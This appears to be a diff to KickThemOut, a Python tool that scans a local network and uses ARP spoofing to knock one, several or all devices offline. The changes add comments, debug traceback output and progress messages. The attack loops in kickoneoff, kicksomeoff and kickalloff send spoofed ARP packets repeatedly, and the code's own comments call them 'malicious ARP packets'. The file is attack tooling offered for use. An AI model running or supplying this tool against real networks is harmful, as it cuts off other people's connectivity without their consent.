@@ -11,15 +11,17 @@ See License at nikolaskama.me (https://nikolaskama.me/kickthemoutproject)
 import time, os, sys, logging, math
 from time import sleep
 import urllib2 as urllib
+import traceback
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
 notRoot = False
 try:
+    # check whether user is root
     if os.geteuid() != 0:
         print("\n{0}ERROR: KickThemOut must be run with root privileges. Try again with sudo:\n\t{1}$ sudo python kickthemout.py{2}\n").format(RED, GREEN, END)
         notRoot = True
 except:
-    # User is probably on windows
+    # then user is probably on windows
     pass
 if notRoot:
     raise SystemExit
@@ -33,8 +35,12 @@ except:
     print("\n{0}If you still cannot resolve this error, please submit an issue here:\n\t{1}https://github.com/k4m4/kickthemout/issues\n{2}").format(RED, BLUE, END)
     raise SystemExit
 
+
+
+# display heading
 def heading():
-    sys.stdout.write(GREEN + """
+    spaces = " " * 76
+    sys.stdout.write(GREEN + spaces + """
     █  █▀ ▄█ ▄█▄    █  █▀    ▄▄▄▄▀  ▄  █ ▄███▄   █▀▄▀█  ████▄   ▄      ▄▄▄▄▀
     █▄█   ██ █▀ ▀▄  █▄█   ▀▀▀ █    █   █ █▀   ▀  █ █ █  █   █    █  ▀▀▀ █
     █▀▄   ██ █   ▀  █▀▄       █    ██▀▀█ ██▄▄    █ ▄ █  █   █ █   █     █
@@ -47,6 +53,9 @@ def heading():
         YELLOW, RED, YELLOW, BLUE).center(111) +
     '\n' + 'Version: {0}0.1{1}\n'.format(YELLOW, END).center(86))
 
+
+
+# display options
 def optionBanner():
     print('\nChoose option from menu:\n')
     sleep(0.2)
@@ -58,10 +67,13 @@ def optionBanner():
     sleep(0.2)
     print('\n\t{0}[{1}E{2}]{3} Exit KickThemOut\n').format(YELLOW, RED, YELLOW, WHITE)
 
+
+
+# initiate debugging process
 def runDebug():
     print("\n\n{0}WARNING! An unknown error has occurred, starting debug...{1}").format(RED, END)
     print(
-    "{0}Starting debug... (Please report this crash on 'https://github.com/k4m4/kickthemout/issues' with your private informations removed if necessary){1}").format(
+    "{0}Starting debug... (Please report this crash on 'https://github.com/k4m4/kickthemout/issues' with your private information removed where necessary){1}").format(
         RED, END)
     print("{0}").format(RED)
     try:
@@ -83,10 +95,18 @@ def runDebug():
         print hostsList
     except:
         print ("Failed to print hostsList array...")
+    try:
+        print ("Crash trace: ")
+        print(traceback.format_exc())
+    except:
+        print ("Failed to print crash trace...")
     print ("DEBUG FINISHED.\nShutting down...")
     print("{0}").format(END)
     raise SystemExit
 
+
+
+# regenerate online IPs array & configure gateway
 def regenOnlineIPs():
     global onlineIPs
     global defaultGatewayMac
@@ -103,14 +123,19 @@ def regenOnlineIPs():
                 defaultGatewayMac = host[1]
 
     if not defaultGatewayMacSet and defaultGatewayMac == "":
+        # request gateway MAC address (after failed detection by scapy)
         print("\n{0}ERROR: Default Gateway MAC Address could not be obtained. Please enter MAC manually.{1}\n").format(RED, END)
         header = ("{0}kickthemout{1}> {2}Enter your gateway's MAC Address {3}(MM:MM:MM:SS:SS:SS): ".format(BLUE, WHITE, RED, END))
         defaultGatewayMac = raw_input(header)
         defaultGatewayMacSet = True
 
+
+
+# scan network
 def scanNetwork():
     global hostsList
     try:
+        # call scanning function from scan.py
         hostsList = scan.scanNetwork(getDefaultInterface(True))
     except KeyboardInterrupt:
         print('\n\n{0}Thanks for dropping by.\nCatch ya later!{1}').format(GREEN, END)
@@ -120,11 +145,17 @@ def scanNetwork():
         raise SystemExit
     regenOnlineIPs()
 
+
+
+# kick one device
 def kickoneoff():
     os.system("clear||cls")
 
     print("\n{0}kickONEOff{1} selected...{2}\n").format(RED, GREEN, END)
+    sys.stdout.write("{0}Hang on...{1}\r".format(GREEN, END))
+    sys.stdout.flush()
     scanNetwork()
+
 
     print("Online IPs: ")
     for i in range(len(onlineIPs)):
@@ -146,6 +177,7 @@ def kickoneoff():
         except:
             print("\n{0}ERROR: Please enter a number from the list!{1}").format(RED, END)
 
+    # locate MAC of specified device
     one_target_mac = ""
     for host in hostsList:
         if host[0] == one_target_ip:
@@ -159,13 +191,16 @@ def kickoneoff():
     print("\n{0}Spoofing started... {1}").format(GREEN, END)
     try:
         while True:
+            # broadcast malicious ARP packets (10p/s)
             spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, one_target_ip, one_target_mac)
             time.sleep(10)
     except KeyboardInterrupt:
+        # re-arp target on KeyboardInterrupt exception
         print("\n{0}Re-arping{1} target...{2}").format(RED, GREEN, END)
         reArp = 1
         while reArp != 10:
             try:
+                # broadcast ARP packets with legitimate info to restore connection
                 spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
             except KeyboardInterrupt:
                 pass
@@ -176,10 +211,14 @@ def kickoneoff():
         print("{0}Re-arped{1} target successfully.{2}").format(RED, GREEN, END)
 
 
+
+# kick multiple devices
 def kicksomeoff():
     os.system("clear||cls")
 
     print("\n{0}kickSOMEOff{1} selected...{2}\n").format(RED, GREEN, END)
+    sys.stdout.write("{0}Hang on...{1}\r".format(GREEN, END))
+    sys.stdout.flush()
     scanNetwork()
 
     print("Online IPs: ")
@@ -219,6 +258,7 @@ def kicksomeoff():
     print("\n{0}Spoofing started... {1}").format(GREEN, END)
     try:
         while True:
+            # broadcast malicious ARP packets (10p/s)
             for i in some_targets:
                 ip = onlineIPs[int(i)]
                 for host in hostsList:
@@ -226,9 +266,11 @@ def kicksomeoff():
                         spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
             time.sleep(10)
     except KeyboardInterrupt:
+        # re-arp targets on KeyboardInterrupt exception
         print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
         reArp = 1
         while reArp != 10:
+            # broadcast ARP packets with legitimate info to restore connection
             for i in some_targets:
                 ip = onlineIPs[int(i)]
                 for host in hostsList:
@@ -243,10 +285,15 @@ def kicksomeoff():
             time.sleep(0.5)
         print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
 
+
+
+# kick all devices
 def kickalloff():
     os.system("clear||cls")
 
     print("\n{0}kickALLOff{1} selected...{2}\n").format(RED, GREEN, END)
+    sys.stdout.write("{0}Hang on...{1}\r".format(GREEN, END))
+    sys.stdout.flush()
     scanNetwork()
 
     print("Online IPs: ")
@@ -260,10 +307,12 @@ def kickalloff():
 
     print("\n{0}Spoofing started... {1}").format(GREEN, END)
     try:
+        # broadcast malicious ARP packets (10p/s)
         reScan = 0
         while True:
             for host in hostsList:
                 if host[0] != defaultGatewayIP:
+                    # dodge gateway (avoid crashing network itself)
                     spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
             reScan += 1
             if reScan == 4:
@@ -274,9 +323,11 @@ def kickalloff():
         print("\n{0}Re-arping{1} targets...{2}").format(RED, GREEN, END)
         reArp = 1
         while reArp != 10:
+            # broadcast ARP packets with legitimate info to restore connection
             for host in hostsList:
                 if host[0] != defaultGatewayIP:
                     try:
+                        # dodge gateway
                         spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                     except KeyboardInterrupt:
                         pass
@@ -286,6 +337,9 @@ def kickalloff():
             time.sleep(0.5)
         print("{0}Re-arped{1} targets successfully.{2}").format(RED, GREEN, END)
 
+
+
+# retrieve network interface
 def getDefaultInterface(returnNet=False):
     def long2net(arg):
         if (arg <= 0 or arg >= 0xFFFFFFFF):
@@ -298,7 +352,8 @@ def getDefaultInterface(returnNet=False):
         if netmask < 16:
             return None
         return net
-    iface_routes = [route for route in scapy.config.conf.route.routes if route[3] == scapy.config.conf.iface ]
+
+    iface_routes = [route for route in scapy.config.conf.route.routes if route[3] == scapy.config.conf.iface and route[1] != 0xFFFFFFFF]
     network, netmask, _, interface, address = max(iface_routes, key=lambda item:item[1])
     net = to_CIDR_notation(network, netmask)
     if net:
@@ -307,16 +362,23 @@ def getDefaultInterface(returnNet=False):
         else:
             return interface
 
+
+
+# retrieve gateway IP
 def getGatewayIP():
     try:
         getGateway_p = sr1(IP(dst="google.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False)
         return getGateway_p.src
     except:
+        # request gateway IP address (after failed detection by scapy)
         print("\n{0}ERROR: Gateway IP could not be obtained. Please enter IP manually.{1}\n").format(RED, END)
         header = ('{0}kickthemout{1}> {2}Enter Gateway IP {3}(e.g. 192.168.1.1): '.format(BLUE, WHITE, RED, END))
         gatewayIP = raw_input(header)
         return gatewayIP
 
+
+
+# retrieve default interface MAC address
 def getDefaultInterfaceMAC():
     try:
         defaultInterfaceMac = get_if_hwaddr(defaultInterface)
@@ -330,13 +392,18 @@ def getDefaultInterfaceMAC():
         else:
             return defaultInterfaceMac
     except:
+        # request interface MAC address (after failed detection by scapy)
         print("\n{0}ERROR: Default Interface MAC Address could not be obtained. Please enter MAC manually.{1}\n").format(RED, END)
         header = ('{0}kickthemout{1}> {2}Enter MAC Address {3}(MM:MM:MM:SS:SS:SS): '.format(BLUE, WHITE, RED, END))
         defaultInterfaceMac = raw_input(header)
         return defaultInterfaceMac
 
+
+
+# resolve mac address of each vendor
 def resolveMac(mac):
     try:
+        # sen request to macvendors.co
         url = "http://macvendors.co/api/vendorname/"
         request = urllib.Request(url + mac, headers={'User-Agent': "API Browser"})
         response = urllib.urlopen(request)
@@ -347,15 +414,19 @@ def resolveMac(mac):
     except:
         return "N/A"
 
+
+
+# script's main function
 def main():
 
+    # display heading
     heading()
 
     print(
         "\n{0}Using interface '{1}" + defaultInterface + "{2}' with mac address '{3}" + defaultInterfaceMac + "{4}'.\nGateway IP: '{5}"
         + defaultGatewayIP + "{6}' --> {7}" + str(len(hostsList)) + "{8} hosts are up.{9}").format(GREEN, RED, GREEN, RED, GREEN, 
                                                                                                 RED, GREEN, RED, GREEN, END)
-
+    # display warning in case of no active hosts
     if len(hostsList) == 0 or len(hostsList) == 1:
         if len(hostsList) == 1:
             if hostsList[0][0] == defaultGatewayIP:
@@ -401,11 +472,16 @@ def main():
 
 if __name__ == '__main__':
 
+    # configure appropriate network info
+    sys.stdout.write("{0}Scanning your network, hang on...{1}\r".format(GREEN, END))
+    sys.stdout.flush()
     defaultInterface = getDefaultInterface()
     defaultGatewayIP = getGatewayIP()
     defaultInterfaceMac = getDefaultInterfaceMAC()
     global defaultGatewayMacSet
     defaultGatewayMacSet = False
+
+    # commence scanning process
     scanNetwork()
 
     main()
